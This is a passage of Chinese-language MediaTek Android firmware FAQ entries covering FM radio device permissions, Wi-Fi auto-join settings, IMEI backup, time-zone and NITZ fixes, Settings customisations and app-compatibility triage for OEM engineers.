Line 14638: 01-02 09:06:19.880  3563  3592 E FMLIB_COM: Open /dev/fm failed, Permission denied
Line 14638: 01-02 09:06:19.880  3563  3592 E FMLIB_COM: Open /dev/fm failed, Permission denied
Line 14639: 01-02 09:06:19.880  3563  3592 I FMLIB_COM: int COM_open_dev(const char*, int*), [fd=-1]  [ret=-1007] 
Line 14640: 01-02 09:06:19.880  3563  3592 E FMLIB_CORE: int FMR_open_dev(int) failed, [fd=-1] 
Line 14640: 01-02 09:06:19.880  3563  3592 E FMLIB_CORE: int FMR_open_dev(int) failed, [fd=-1] 
Line 14641: 01-02 09:06:19.880  3563  3592 D FMLIB_JNI: jboolean openDev(JNIEnv*, jobject), [ret=-1007] 
Line 14642: 01-02 09:06:19.880  3563  3592 E FM/FMRadioService: Error: opendev failed

1. 在alps\vendor\mediatek\proprietary\packages\apps\FmRadio\Android.mk
修改 LOCAL_CERTIFICATE := platform，原先是media。

2. 在alps\vendor\mediatek\proprietary\packages\apps\FmRadio\ AndroidManifest.xml中添加
<uses-permission android:name="android.permission.ACCESS_FM_RADIO" />

3. 在device/mediatek/common/sepolicy/system_app.te 里面添加下面这行
allow system_app fm_device:chr_file { read write ioctl open};
```

## [FM]  [FAQ04171]  打开fm设备节点被拒绝

```text
打开fm设备节点被拒绝，从mobile log中的main log发现是由于权限问题。
检查init.rc中加载fm驱动时，创建的fm设备节点权限为660，为何上层打开FM还是会失败。
[SOLUTION] 
在alps/mediatek/source/packages/FMRadio里面的AndroidManifest.xml文件中加上<uses-permission android:name="android.permission.ACCESS_MTK_MMHW">
```

## [FM]  [FAQ09547]  FM搜不到104M频点

```text
104M是一个desense频点，软件中作了特殊了处理是这个台不被搜到。但是比如在印度104M本身是一个有效频点，那么需要修改软件将这104作为正常的频点来处理。

要把104M台当做正常台的处理需要修改三处地方：

针对MT6628

1)修改alps/mediatek/source/external/fmradio/custom/fmlib_cust.h文件，从MT6620_FM_FAKE_CHANNEL中拿掉104M

2) 修改alps\mediatek\source\kernel\drivers\fmradio\mt6628\pub中的mt6628_fm_lib.c文件：

将数组mt6628_mcu_dese_list[] 和mt6628_scan_dese_list[] 中的104拿掉

针对mt6627：

1)修改alps/mediatek/source/external/fmradio/custom/fmlib_cust.h文件，从MT6620_FM_FAKE_CHANNEL中拿掉104M

2) 修改alps\mediatek\source\kernel\drivers\fmradio\mt6627\pub中的mt6627_fm_lib.c文件：

将数组mt6627_mcu_dese_list[] 和mt6627_scan_dese_list[] 中的104拿掉

对于L版本修改方法跟上面的相同，只是文件的路径有变化，说明如下：

1、mt6627_scan_dese_list和mt6627_mcu_dese_list对应的文件如下：

alps\kernel-3.10\drivers\misc\mediatek\fmradio\mt6627\pub\mt6627_fm_lib.c

2、 MT6627_FM_FAKE_CHANNEL对应的文件为：

alps\hardware\mediatek\fmradio\fmnative\custom\custom.cpp

需要注意我们这边的定义有用MTK_FM_50KHZ_SUPPORT包起来，要注意修改对位置。
```

## [FAQ14734]  L版本上auto join 和auto save的配置开关

```text
1，auto join
L版本上的一项auto join 的新功能，即每次scan 之后，会比较scan 到的ap 来决定是否要切换到其他ap 去
如果想关闭此功能测试，请修改如下位置：
/frameworks/base/core/res/res/values/config.xml
<bool translatable="false" name="config_wifi_framework_enable_associated_network_selection">true</bool>
将这里的true 改为false；
但是这里请注意side effect ：如果关闭了此auto join 功能，会出现如下现象：
A,B两个已保存ap ，连接A ，断开A 之后，不会自动去连接B ，还请特别注意！
 
2，auto save
连接ap1之后，断开ap1连接，自动去连接名字类似的ap2，但是ap 2开始并不是已保存的ap；
L版本上新功能，自动保存ssid 和bssid 类似的ap；
例如如下log中的两个ap；
Line 126703: 07-28 14:36:14.426 1099 1099 D wpa_supplicant: wlan0: selected BSS 50:17:ff:35:da:e0 ssid='SF-client'
Line 131516: 07-28 14:36:26.372 1099 1099 D wpa_supplicant: wlan0: selected BSS 50:17:ff:35:da:e1 ssid='SF-office'
 
如果需要关闭此功能，请提eservice，申请如下patch：ALPS02217759；
此patch在配置文件中做了一个option，用于对此功能的选择开关；
如果需要此功能，可以直接通过打开此option，
false:表示关掉auto save
```

## [FAQ04539]  [Maui Meta] 写IMEI或校准后如何正确保存参数

```text
使用MauiMETA写IMEI或做RF校准，手机恢复出厂设置之后参数丢失问题
MauiMETA写IMEI、做RF校准后相关参数保存在USRDATA区，正常是需要备份到NVRAM Bin Region

[Solution] 
1.确认在MauiMETA的"Options"菜单有选择"Backup to BackupPartition/SDS before disconnect"项
2.写完IMEI（或校准）后点"Disconnect"按钮正常退出META模式
3.待正常退出后在断电（手机会关机）
```

## [apn]  [FAQ12399]  [Common] spn 如何添加特殊‘&’符号

```text
在\mediatek\frameworks\base\telephony\etc\spn-conf.xml中配置运营商名称，名称字符串包含‘&’时编译出错，该如何添加?

Xml文件里面配置‘&’需要使用‘&#038;’代替，例如：
对spn-conf.xml中需要配置运营商名称“AT&T”的位置使用：
“AT&#038;T”
```

## [FAQ02912]  [Common] 如何判断sim卡是4G、3G、2G卡

```text
SIM卡是4G、3G卡还是2G卡是由网络来判断的；
例如若这张卡可以注册上4G网络，那这张卡就是4G卡，否则就是3G or2G卡。SIM卡本身是不携带4G、3G还是2G信息的，所以无法通过获得SIM卡的某些信息来做判断。
```

## [性能]  [FAQ08629]  如何更改后台进程限制默认值

```text
ActivityManagerService.java (alps\mediatek\custom\bsp_overlay\frameworks\base\services\java\com\android\server\am)  中
int mProcessLimitOverride 的值即可
```

## [默认值]  [FAQ08894]  如何将"设置->开发者选项"这个菜单的总开关默认设置为Off”

```text
在进入“设置->开发者选项”这个菜单后，系统默认该菜单项的总开关为On，如果想改为Off，可以做如下修改，使得Switch开关默认为Off。
[SOLUTION] 
在alps/packages/apps/settings/src/com/android/settings/DevelopmentSettings.java中的onResume()方法中
将如下代码注释掉：
/*
if (mHaveDebugSettings && !mLastEnabledState) {
    // Overall debugging is disabled, but there are some debug
    // settings that are enabled.  This is an invalid state.  Switch
    // to debug settings being enabled, so the user knows there is
    // stuff enabled and can turn it all off if they want.
    Settings.Global.putInt(getActivity().getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 1);
    mLastEnabledState = true;
    mEnabledSwitch.setChecked(mLastEnabledState);
    setPrefsEnabledState(mLastEnabledState);
}
*/
```

## [settings]  [FAQ07782]  在法律信息中添加菜单

```text
请在device_info_settings.xml (alps\packages\apps\settings\res\xml)
中下面部分添加,其中JASONYYY是我添加的一个菜单项,贵司可以对照修改.
action部分为该菜单项对应的intent.
 <!-- Legal Information -->
<PreferenceScreen
    android:key="container"
    android:title="@string/legal_information">
    <!-- Note: The titles given here probably won't be used.  Instead, we programmatically
        fill the title with the label of the activity with the corresponding action.
        If there is not an activity for an action, the item will be removed from the
        list. -->
    <!-- Copyright information -->
    <PreferenceScreen
        android:key="copyright"
        android:title="@string/copyright_title">
        <intent android:action="android.settings.COPYRIGHT" />
    </PreferenceScreen>
    <!-- License information -->
    <PreferenceScreen
        android:key="license"
        android:title="@string/license_title">
        <intent android:action="android.settings.LICENSE" />
    </PreferenceScreen>
    <!-- Terms and conditions -->
    <PreferenceScreen
        android:key="terms"
        android:title="@string/terms_title">
        <intent android:action="android.settings.TERMS" />
    </PreferenceScreen>
    <!-- Terms and conditions -->
    <PreferenceScreen
        android:key="JASONYYY"
        android:title="JASONYYY">
        <intent android:action="android.settings.LICENSE" />
    </PreferenceScreen>
</PreferenceScreen>
```

## [FAQ04994]  如何去掉ListView/GridView等列表控件滑到顶部或底部时的模糊边缘效果?

```text
修改如下文件：
alps/frameworks/base/core/java/android/view/View.java文件中的View的一个构造方法，
将其中这一行 setOverScrollMode(OVER_SCROLL_IF_CONTENT_SCROLLS);
修改为：setOverScrollMode(OVER_SCROLL_NEVER);

public View(Context context) {
    mContext = context;
    mResources = context != null ? context.getResources() : null;
    ......
    mTouchSlop = ViewConfiguration.get(context).getScaledTouchSlop();
    setOverScrollMode(OVER_SCROLL_NEVER);
    mUserPaddingStart = UNDEFINED_PADDING;
    mUserPaddingEnd = UNDEFINED_PADDING;
}
注意：上述的修改是将系统中所有使用列表控件的界面的这种顶部/底部边缘模糊效果都去掉了，而不是只针对单个控件的，
如果要消除某一个控件的顶部/底部边缘模糊效果的话，可以通过设定控件的xml属性android:overScrollMode 或者setOverScrollMode(int overScrollMode)这个方法去单独设置即可。
```

## [FAQ04905]  如何在任意界面按某个预设定的硬体按键进入某个Activity?

```text
实现在任意非锁屏界面，按某个预设定好的按键进入某个Activity的功能

修改alps/frameworks/base/policy/src/com/android/internal/policy/impl/PhoneWindowManager.java文件中的如下方法：
public long interceptKeyBeforeDispatching(WindowState win, KeyEvent event, int policyFlags)
找到如下代码段：
else if (keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
    if (......) {
        ......
    }
    return -1;
}
在这个else if后面增加相应代码：
else if (keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
    if (......) {
        ......
    }
    return -1;
} //add begin
else if (keyCode == KeyEvent.KEYCODE_XXX) {
    if (down && repeatCount == 0 && !keyguardOn) {
        mContext.startActivity(new Intent("intent.xxx").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }
    return -1;
}  // add end

注意:
1、上面写的KeyEvent.KEYCODE_XXX是预设定好的硬按键的键值，根据需要来设定即可；
2、startActivity(new Intent("intent.xxx")中的intent.xxx需要根据所启动的activity来写
```

## [sim]  [FAQ11540]  [Common] 如何获取ICCID

```text
如何获取(U)SIM卡的唯一标识ICCID (Integrate Circuit Card IDentification)
[SOLUTION] 
 
ICCID保存在(U)SIM卡文件中，需要等到开机(U)SIM卡初始化后才能获取到；
方法1：通过SystemProperty获取：
由于开机在RILD会下AT CMD："AT+ICCID?" 去获取个卡的ICCID并保存在对应SystemPrority中，所以可以在上层直接到对应SystemPrority中获取：
(1) 在上层需要获取ICCID的java文件中 import android.os.SystemProperties;
(2)定义SystemProperty：
    private String[]  PROPERTY_ICCID_SIM = {
        "ril.iccid.sim1",              //for SIM1
        "ril.iccid.sim2",
        "ril.iccid.sim3",              //if your project is triple SIMs project
        "ril.iccid.sim4",              //if your project is quad SIMs project
    };
(3)定义string来调用get方法接收ICCID
mIccId[simIdx] = SystemProperties.get(PROPERTY_ICCID_SIM[simIdx] );
方法2：IccRecords.java中有public方法 getIccId来获取
 
如果ICCID显示异常，可以参考如下FAQ
ID: FAQ11502[Common] iccid显示异常
```

## [FAQ10436]  [Common] 默认显示MM reject cause的通知

```text
1.在alps/medatek/frameworks/base/op/java/com/mediatek/op/telephony/ServiceStateExt.java
中，更改方法needRejectCauseNotiication(),对特定的cuase返回true，这样在发生MM reject时，如果cause匹配上就会显示出通知。
 
如果想全部cause都显示通知，直接返回ture即可。
 
2.需要注意的是，需要check一下ServiceStateExtOPXX.java是否有重新改方法，如果有重写该方法，则需要到ServiceStateExtOPXX.java里面的needRejectCauseNotiication中去进行修改；
例如，
alps/medatek/frameworks/base/op07/java/com/mediatek/op/telephony/ServiceStateExtOP07.java
里面有去重写needRejectCauseNotiication方法；

什么是MM reject???
```

## [FAQ12269]  互动屏保无法使用google相册显示，将此菜单隐藏?

```text
预置条件：
安装GMS包，已登录google帐户并存有图片；
测试步骤：
settings-->display-->daydream-->google photos-->start now；
预期结果：
能进入互动屏保界面；
实测结果：
终端不能进入屏保界面，终端闪退。
对比机也有该问题，能否将此菜单隐藏，该如何处理?

[SOLUTION] 
修改 Settings 源码中的 DreamSettings.java 添加
import java.util.ArrayList;
......
修改refreshFromBackend的实现
private void refreshFromBackend() {
    logd("refreshFromBackend()");
    mRefreshing = true;
    boolean dreamsEnabled = mBackend.isEnabled();
    if (mSwitch.isChecked() != dreamsEnabled) {
        mSwitch.setChecked(dreamsEnabled);
    }
    mAdapter.clear();
    if (dreamsEnabled) {
        List<DreamInfo> dreamInfos = mBackend.getDreamInfos();
        List<DreamInfo>  filteredDreamInfo = new ArrayList<DreamInfo>(); // modify begin
        for(int i= 0;i< dreamInfos.size();i++){
            DreamInfo info = dreamInfos.get(i);
            if(info.componentName.toString().contains("com.google.android.apps.plus"))
                continue;
            filteredDreamInfo.add(info);
        }
        mAdapter.addAll(filteredDreamInfo);    //modify end
    }
    if (mMenuItemsWhenEnabled != null) {
        for (MenuItem menuItem : mMenuItemsWhenEnabled) {
            menuItem.setEnabled(dreamsEnabled);
        }
    }
    mRefreshing = false;
}
```

## [FAQ14728]  [SP Multiport Download Tool] Download checksum分级机制

```text
Checksum匹配是保证下载完整性的一种机制，了解Download tool的checksum机制，对我们分析下载不完整问题和提高产线效率是非常重要。

[SOLUTION] 
从W1516版本的MDT（SP Multiport Download Tool）开始，MDT下载可以支持4个级别的DA checksum，如图：

4个级别的DA checksum分别如下：
Disable Checksum: 不做DA checksum，即下载时不做任何checksum，不保证下载的完整性。
Enable USB+Dram Checksum: 会在PC Ram和手机或者板子的Ram两边做checksum，并compare 这两个checksum是否一致，这个级别没有把Flash上的image读出来并计算checksum与下载前image checksum做比较，故只能保证USB通信两边的数据在Dram的完整性。
Enable Flash Checksum: download 到手机的flash之后，回读做checksum，然后与PC 侧image的check做比较检查是否一致。这个级别不会做Enable USB+Dram Checksum这个checksum检查。
Enable Checksum All: 这个是Enable USB+Dram Checksum和Enable Flash Checksum总和，即两种mode都会做。

参考FAQ: 
FAQ08732 [SP Multiport Download Tool] Flashtool checksum原理简单介绍
```

## [log]  [FAQ17415]  如何在factory mode下将modem log存放在内置SD

```text
从6755 L1.MP10开始支持factory mode sd logging功能，mobile log仅可保存在外置SD。 modem log支持USB/SD方式。存放方式在正常开机MTKLogger页面中通过修改modem log mode进行设置。设置后需要将MTKLogger start起来。

如果选为是SD存放，factory mode默认是存放在外置SD（抓取方式参考FAQ15308），用户可根据需要修改为内置SD，以下介绍修改方法
[SOLUTION] 
修改/data/mdlog/mdlog1_sd_config （modem1 sd log配置文件）及/data/mdlog/mdlog3_sd_config   （modem3 sd log配置文件）
用UE可打开修改   1è内置    2è外置
这个文件在factory mode中运行一次emdlogger1/3自动生成，默认是2，也可以修改后adb push到相应路径。如果功能不生效
请检查是否有上patch ALPS02412333

参考FAQ：
FAQ14184--Factory Mode下USB抓取modem log的方法
FAQ15308--FactoryMode下用SD卡抓取mobilelog及modemlog
```

## [FAQ09749]  LCA项目，DayDream屏保功能默认关闭，如何打开?

```text
LCA版本有很多feature或功能都没有打开，包括DayDream，可按如下方法打开开关，但有可能由此引发performance问题，请自行斟酌。
 
[SOLUTION] 
修改alps\mediatek\custom\common\resource_overlay\LCA_ram\frameworks\base\core\res\res\values\config.xml，将
<bool name="config_dreamsSupported">false</bool>
修改为
<bool name="config_dreamsSupported">true</bool>
L版本上如果是512M 和1024M的项目，也会因为 ro.mtk_gmo_ram_optimize 为1或者
ro.mtk_lca_ram_optimize 为 1 导致在 DisplaySettingsEx.java
中 initPreference 函数内会 remove KEY_SCREEN_SAVER 的 Preference. 如果一定要开，
可以把该函数内的这一段逻辑删除。删除的影响是会吃掉一些memory，故对memory不算富余的项目，自行斟酌是否要开。
```

## [clock]  [FAQ06645]  [TimeZone] 如何解决在欧洲城市自动更新时区错误

```text
欧洲某些运营商的NITZ消息比正常的NITZ消息少一位，缺少的是夏令时参数，在这样的情况下，会造成手机获得的时区错误，通常显示为非洲某时区。

对于缺少dst参数的NITZ消息，我们需要通过其他方式来获取和补充这个参数。这里的修改方法是根据手机的TelephonyProperties.PROPERTY_ICC_OPERATOR_NUMERIC这个属性中的mcc信息，即目前所在国家来判断的。

step1:修改ServiceStateTracker.java(frameworks\base\telephony\java\com\android\internal\telephony)
在setTimeFromNITZString这个方法中，修改dst的申明和定义语句如下：
int dst = (nitzSubs.length >= 8 ) ? Integer.parseInt(nitzSubs[7] ) : mccDst( getMcc() ,  c.getTimeInMillis());

step2:添加获取mcc参数的方法getMcc（）
//getMcc方法的定义如下（如果已经有这个函数，不用重复添加）：
private int getMcc(){
    int mccmnc = 0;
    int mcc=0;
    if (phone.getMySimId() == Phone.GEMINI_SIM_1) {
        mccmnc = SystemProperties.getInt(TelephonyProperties.PROPERTY_ICC_OPERATOR_NUMERIC, 0);
    } else {
        mccmnc= SystemProperties.getInt(TelephonyProperties.PROPERTY_ICC_OPERATOR_NUMERIC_2, 0);
    } 
    try {
        mcc = mccmnc/100;
    } catch (NumberFormatException e) {
        Log.e(LOG_TAG, "Error parsing IMSI");
    }
    return mcc;
}
 
step3:添加根据mcc参数获取dst参数的方法mccDst()
//mccDst方法的定义如下
private int mccDst(int mcc, long when) {
    String tz = MccTable.defaultTimeZoneForMcc(mcc);
    if (tz==null) {
        return 0;
    }
    TimeZone timezone = TimeZone.getTimeZone(tz);
    if(timezone==null) {
        return 0;
    }
    Date d = new Date(when);
    return timezone.inDaylightTime(d)==true?1:0;
}
```

## [clock]  [FAQ09004]  【TimeZone】俄罗斯插MTS卡测试，时区自动同步到错误时区

```text
在俄罗斯进行测试，插当地SIM卡，勾选“自动确定时间”和“自动确定时区选项”，发现时区更新到"GMT+4:00,Samara Time"，预期显示为"GMT+04:00,Moscow Standard Time"。

原因：

俄罗斯在2010年和2011做过2次时区调整，2010年，将原本的11个时区合并到9个时区；2011年，永久使用夏令时。在调整之前，俄罗斯是属于+3时区，使用夏令时的；调整之后，俄罗斯属于+4时区，没有夏令时。

由于俄罗斯的时区调整，可能会出现下面两个问题：

1.将手机时间调到2013年1月1日，时区调整到Moscow，Moscow的时区是GMT+3时区，正确应该是GMT+4。这个问题原因是android在2010或2011年之前的版本，zoneinfo.dat文件版本较旧，没有包含俄罗斯时区调整后的规则。所以如果出现Moscow时区是GMT+3的问题，请参考FAQ05710更新dat文件。(Android中的时区数据文件zoneinfo.dat编译好之后只读的，所以download到手机之后，该文件不能自动更新)

FAQ05710 【Zone】如何更新时区data文件

2.勾选“自动更新时区”，时区变成"GMT+4:00,Samara Time"。这个问题是因为虽然zoneinfo.dat更新了，但是time_zones_by_country.xml文件没有更新。在这个xml文件中同时有Samara和Moscow，目前Samara时区和Moscow时区都是GMT+4时区，而Samara在该文件中排序靠前，所以查找时会优先返回。参考本FAQ可以修正这种错误。

解决方法：
修改time_zones_by_country.xml(framework/base/core/res/res/xml/)，把含有Samara的那行删除。
```

## [clock]  [FAQ05703]  手机加密前后，时间显示不一致

```text
此现象是正常的。
在加密后，手机的data区域都经过加密了，而手机的时区信息也存储在这里，在未解密之前不能获取到该区域的数据，所以输入密码界面显示的时间会是通过默认时区计算而来的时间。
```

## [clock]  [FAQ14883]  google 开机设置时区界面找不到对应时区

```text
安装了setup wizard，在开机向导中的时区选择列表中找不到对应的时区，
如（希望在开机向导中找到上海时区，而开机向导中只有北京时区）；

而在设置--时区能够找到该时区如（在设置中可以找到上海时区）。
[SOLUTION] 
由于开机向导中的时区列表是GOOGLE自行定义的并非是系统定义的,
而设置--时区中的时区列表是在setting中定义的。

同时在开机向导显示默认时区会分为两种情况：

1.插入sim卡，根据sim卡获取对应的时区，如果开机向导列表中没有对应时区,
setup wizard 会选择其他时区。
2.没插sim卡，根据系统默认时区，如果开机向导列表中没有对应时区,
setup wizard 会选择其他时区。

由于GOOGLE setupwizard 是GOOGLE直接释放的APK,没有源码可以修改，建议接受这种现象。
```

## [clock]  [FAQ04790]  不勾选从网络自动更新时间，时间仍然会从网络获取时间更新?

```text
不勾选：从网络自动更新时间，时间仍然会从网络获取时间更新?
[DESCRIPTION] 
在设置中的Data&Time里面的：自动确定日期和时间，不勾选：使用网络提供时间，但时间仍然会从网络获取并更新，下面方法可以解决此问题。
[SOLUTION] 
在界面中测试发现一个规律：

取消“auto time”，然后“select time zone”，“set time”， “Use 24-hour format”， “Select date format”等选项的改变都不会去更新时间，唯独“set date”这项，在改变year的时候会有去网络更新时间的动作，而且是在改变后的year比当前year要大时才动作，如果小则还是不会触发。 例如2012年改为2013年点确定然后就会自动更新，而2012年改为2010年等小些的年份则不会自动更新。

log如下：
# D/SystemClock(  362): Setting time of day to sec=1363240369
smdkc110-rtc smdkc110-rtc: rtc disabled, re-enabling
I/EventLogService(  330): Aggregate from 1331704345962 (log), 1331962934668 (data)
I/CheckinService(  330): Preparing to send checkin request
I/EventLogService(  330): Accumulating logs since 1363240369496
D/ResourceType(  330): calling getConfigurations
D/ResourceType(  330): called getConfigurations size=243
I/CheckinTask(  330): Sending checkin request (952 bytes)
E/CheckinTask(  330): SSL error, attempting time correction: javax.net.ssl.SSLHandshakeException: org.bouncycastle.jce.exception.ExtCertPathValidatorException: Could not validate certificate: current time: Thu Mar 14 13:52:50 GMT+08:00 2013, expiration time: Fri Mar 08 16:53:51 GMT+08:00 2013
smdkc110-rtc smdkc110-rtc: rtc disabled, re-enabling
W/CheckinTask(  330): Setting time from 1363240370708 to 1331963570459
D/SystemClock(   83): Setting time of day to sec=1331963570
D/ResourceType(  330): calling getConfigurations
D/ResourceType(  330): called getConfigurations size=243
I/CheckinTask(  330): Checkin success: https://android.clients.google.com/checkin (1 requests sent)

在设备中查询可得到 CheckinService其实是在GoogleServiceFramework.apk中的，没有源代码无法修改。

反编译GoogleServiceFramework.apk能得到一些有用的信息，反编译后查询到
I/CheckinService(  330): Preparing to send checkin request
存在于com.google.android.gsf/checkin/CheckinService$1
class CheckinService$1 extends CheckinTask {
    public ProtoBuf doInBackground(CheckinTask.Params[]  paramArrayOfParams) {
        int i = 0;
        ProtoBuf localProtoBuf;
        while (CheckinService.access$100(this.this$0)) {
            Log.i("CheckinService", "Preparing to send checkin request");
            EventLogService.captureLogs(this.this$0);
            localProtoBuf = super.doInBackground(paramArrayOfParams);
            CheckinService.access$200(this.this$0, localProtoBuf);
        }
        return localProtoBuf;
    }
}
看到doInBackground就怀疑是不是后台传输的问题，于是到“Accounts & sync settings”中，关掉“Background data”,然后再在时间中设置，果然不会再变化!
所以修改系统让后台数据功能默认关闭。
frameworks/base/packages/SettingsProvider/res/values/defaults.xml
    <bool name="def_install_non_market_apps">true</bool>
    <!-- jeff add default background data on/off. -->
    <bool name="def_background_data">false</bool>
frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java
private void loadSecureSettings(SQLiteDatabase db) {
    //jeff. def background data.
    loadBooleanSetting(stmt, Settings.Secure.BACKGROUND_DATA, R.bool.def_background_data);
默认不开启后台数据，可以是解决这个问题的一个方法。
```

## [clock]  [FAQ04320]  自动更新时间/时区问题

```text
自动更新时间是根据NITZ消息来更新当前系统的时间，例如时区和时间，打开为什么不起作用?

这个是由于NITZ 功能需要网络运营商的支持，有很多运营商不支持此功能，那么注册到对应的运营商就不会自动更新时间，这个是正常现象，手机端是有支持的。
此外，NITZ 消息是网络端来决定什么时候发送，手机端只是被动接收。可通过对比机测试是否自动更新时间来看是否是运营商支持问题。
```

## [clock]  [FAQ06187]  【Zone】如何解决插卡开机自适应时区错误的问题

```text
1    自适应时区介绍及问题分析
MTK平台手机在download完后,首次开机如果插有SIM卡,会根据SIM卡进行时区和语言的自适应,比如,项目的默认语言是英语,默认时区是0时区,插中国移动(46000)卡开机,在进入Android之后,会看到界面语言变成了简体中文,时区变成GMT+8 北京时区.

但是在某些情况下,自适应的时区可能是错误的,主要分为2种情况:1种是自适应的时区为0时区,另一种是非0的错误时区.这两种问题的原因不同,但是解决方法是类似的.

根据SIM卡自适应时区的流程如下:
MccTable.java -> 根据mcc获取country code
zoneinfo64.txt -> 获取country code在数组中的index值(数组)
zoneinfo64.txt -> 根据index值获取对应的timezone id(数组)
MccTable.java -> 返回id[0] 为自适应的时区

对于自适应时区为0时区的情况,原因是zoneinfo64.txt这个文件中的某些时区id是非ISO标准的,在Android中无法获取该时区的相关信息,就会返回默认的GMT+0的时区,下面会以【插阿根廷（72207）卡时区自适应时区为0时区】为例进行说明。

对于非0但错误的时区,原因是该国家有多个时区,而在zoneinfo64.txt中,时区是按字母排序的,所以得到的该国家的第一个时区是字母排序靠前的时区,而不是首都所在的时区.这种情况目前只有在俄罗斯测试出现过,因此以【插俄罗斯SIM卡自适应时区不是Moscow】为例进行说明。

2    插阿根廷（72207）卡时区自适应时区为0时区
从插卡匹配的代码流程来看，mcc为722时返回时区id为AGT，这个时区和Buenos_Aires是使用的一个时区，但是这个时区ID是缩写，非ISO标准，所以时区数据库里面没有，因而会找不到,就会返回0时区.
解决方法：让mcc为722时，MccTable中，直接返回时区Buenos_Aires，即做如下修改：
文件：frameworks\base\telephony\java\com\android\internal\telephony\MccTable.java
函数：public static String defaultTimeZoneForMcc(int mcc)
代码：
returntz[0] ;
修改为：
if(mcc==722&&tz.length>1)
   returntz[1] ;
else
   returntz[0] ;

3    插俄罗斯卡自适应时区不是Moscow
问题描述：插俄罗斯SIM卡首次开机，时区根据SIM卡改变，但是时区没有变成GMT+4时区(Moscow)，而是变成了GMT+12时区(Anadyr)。

问题原因：在zoneinfo64.txt这个时区的索引文件中，各个国家和地区的城市顺序是按照字母顺序排列的，根据SIM卡查找，会返回该国家排序靠前的城市。每个国家和地区都有多个城市，有的对应不同的时区。有的是同一个时区，俄罗斯属于不同城市可能属于不同时区，而Anadyr是GMT+12时区的.

解决方案：mcc为250时，返回Moscow时区的id。
文件：frameworks\base\telephony\java\com\android\internal\telephony\MccTable.java
函数：public static String defaultTimeZoneForMcc(int mcc)
代码：
returntz[0] ;
修改为：
if(mcc==250&&tz.length>13)
    returntz[13] ;
else 
returntz[0] ;
```

## [默认值]  [FAQ09022]  如何调整锁屏界面的背景亮度

```text
锁屏和launcher一样，都是透到wallpaper上的.但是同样一张wallpaper背景图片，在锁屏界面上看起来要比launcher暗一些。
这是因为锁屏界面设置了一个半透明的灰色背景色0X70000000。
如果需要调整锁屏界面的背景色，可以通过调整KeyguardViewBase.java中BACKGROUND_COLOR的值。
 
L上的修改参考如下:
ScrimView.java()
private float mViewAlpha = 1.0f; // 将1.0f修改为0.0f.
```

## [font]  [FAQ17408]  如何解决字体有毛刺或边缘模糊的问题?

```text
问题的原因是HWUI与底层GPU driver未统一浮点数精度。
 
现有一解法，改在HWUI这边，将浮点数精度统一改为高精度
在如下地方做修改：
/frameworks/base/libs/hwui/ProgramCache.cpp
const char* gFS_Header = "precision mediump float;\n\n";      =>将此行中的 mediump 改为 highp

备注：将精度由medium改为high，GPU的performance降低约2%，对memory 的占用几乎不受影响，因此改法对整体性能影响不大。
```

## [debug]  [FAQ13604]  L版本APP不兼容问题第一手分析

```text
L版本和KK/JB系列版本相比改动较大，所以L版本的APPIOT问题要特别注意。
那么L版本上遇到APPIOT问题如何分析呢?
[SOLUTION] 
请按照以下步骤进行排查：
第一步
mtkonline上查询ALPS_3rdparty_APPIOT_W15xx.xlsx (放在mtkonline的QVL/DRL->Software下)，确认此问题是否是已知问题
（L0/L1版本那一栏有列出我们目前发现的L版本APP不兼容的已知问题）

第二步
请使用最新版本apk测试，若最新版本ok，那么是apk 本身问题，直接使用最新版本即可。
若最新版本也有问题，进行第三步。

第三步
请使用最新版本apk做对比测试，对比机为非MTK平台L版本(例Nexus 5（ 32bit）)
若对比机可以复现，则是apk 在L 版本兼容性问题，请vendor 来修改。
若对比机不可以复现，进行第四步。
（因为一些apk对64位的手机兼容不好，若贵司手机是64位手机，如有条件请使用64位的对比机进行测试）

第四步
请按照MTK online FAQ04289来检查手机的配置信息。

第五步
ART引起的APPIOT现象不定。
请申请最新版本的libart.so再测试问题。
L0：请申请patch ALPS02149675
L1：请申请patch ALPS02125533

第六步 
请测试MTK driver only 版本是否可以复现?
如果不能复现，请帮忙缩小范围，是什么修改导致或mtk 某个patch 导致问题?
如果能复现，请按照 MTK online FAQ04289确认手机配置信息。

第七步
若发生了死机/NE，请判断是挂死在第三方lib 中，还是在平台的lib 中?
如果发生在第三方lib 中，请先找vendor 来解决，因为MTK 没有其symbol，没办法解决。
如果是死在MTK 平台的lib或dex中，请提交eService给MTK分析。

第八步
对于NE 的问题提交eServcie 时请一并提交NE的backtrace 对应lib 的symbols 文件。
其他异常问题请描述清楚复现步骤提供mtklog且同步提交发生问题的apk。
界面异常的问题请录像且提供mtklog以及发生问题的apk。

对于APPIOT问题更加详细的介绍，请参考 FAQ:ID: FAQ04289 APPIOT问题第一手分析以及对比测试注意事项
```

## [FAQ12664]  备份与恢复，备份后，会多出来3张原本图库没有的图片（cmcc）

```text
备份与恢复，备份后，会多出来3张原本图库没有的图片：drm_disable_icon.png，edge.png，edge720p.png
多出来的这三张图片是系统自带的图片，位于/system/media/目录（手机内部存储）下，而我们的备份还原会备份除外部可移除的SD卡外的所有存储位置的图片，所以才会备份出来。
如果您觉的备份系统图片不符合您的要求，您可以将alps/mediatek/operator/OP01/packages/apps/BackupRestore/src/com/mediatk/backuprestore/modules/PictrueBackupComposer.java中的 PICTUREURIARRAY的内部存储URI删除即可。
```

## [apn]  [FAQ08427]  如何让默认的APN从列表里消失（不通过修改apns-conf.xml）

```text
可以修改MCC或者MNC为错误的然后保存确认,这个时候，默认的APN就会从列表里自动消失
比如CMCC CMWAP的MCC 是460   MNC是00
可以修改MCC为462，保存或者修改MNC为01保存
因为数据库是会先通过MCC和MNC来确定APN在列表里显示
```

## [FAQ11946]  恢复出厂设置或者第一次开机后.会短暂性显示数据连接图标

```text
这个问题是由于SetupWizard.apk开机向导所导致的
请在 ConnectivityService.java 中的 checkMobileProvisioning()这个方法的开头加上如下代码：
final int uid = Binder.getCallingUid();
log("checkMobileProvisioning callingUid" + uid);
boolean isMobileProvision = mContext.getResource().getBoolean(com.mediatek.internal.R.bool.is_mobile_provision_enabled);
log("isMobileProvision:" + isMobileProvision  );
if(!isMobileProvision){
    return;
}

return 直接返回 suggestedtimeoutms
```

## [usb]  [FAQ11320]  USB tethering以及USB internet的使用说明

```text
1.USB tethering 是PC利用手机的网络进行上网。
使用前提：安装RNDIS驱动（必须）
